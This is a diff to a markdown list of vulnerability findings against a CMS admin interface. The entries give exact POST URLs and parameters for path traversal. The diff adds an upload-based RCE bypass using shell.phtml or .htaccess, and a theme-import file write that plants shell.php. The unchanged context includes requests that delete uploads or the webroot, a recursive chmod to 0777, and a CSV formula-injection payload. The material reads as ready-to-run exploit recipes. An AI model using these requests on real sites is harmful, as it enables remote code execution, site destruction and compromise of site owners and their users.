@@ -65,6 +65,7 @@
 - URL: `POST https://TARGET/admin/moduleinterface.php?mact=FilePicker,m1_,ajax_cmd,0&__c=KEY`
 - Data: `cmd=mkdir&cwd=&val=foo/../../../evil` (or `cmd=del&val=<file>`, `cmd=upload`)
 - Req: any authenticated admin (no file permission needed).
+- RCE note: `cmd=upload` with a `shell.phtml`/`.htaccess` (default profile blocks only `php*`) → code execution by any admin, no file perm.
 
 **14. Search — CSV/formula injection (unauth seed)**
 - Seed: `https://TARGET/index.php?mact=Search,cntnt01,dosearch,0&cntnt01searchinput==cmd|'/c calc'!A1`
@@ -104,3 +105,8 @@
 - URL: `POST https://TARGET/admin/moduleinterface.php?mact=ModuleManager,m1_,local_remove,0&__c=KEY`
 - Data: `m1_mod=../uploads` (deletes uploads) · `m1_mod=..` (deletes webroot) · use `local_chmod` + `m1_mod=../..` to chmod -R 0777
 - Req: "Modify Modules" perm.
+
+**22. DesignManager import — path traversal arbitrary file write (RCE)**
+- URL: `POST https://TARGET/admin/moduleinterface.php?mact=DesignManager,m1_,admin_import_design,0&__c=KEY` (upload XML, then confirm steps 2-3)
+- Data: design/theme XML with a `__URL,,` file entry `<value>../../../shell.php</value>` + base64 PHP `<data>`
+- Req: "Manage Designs" perm.
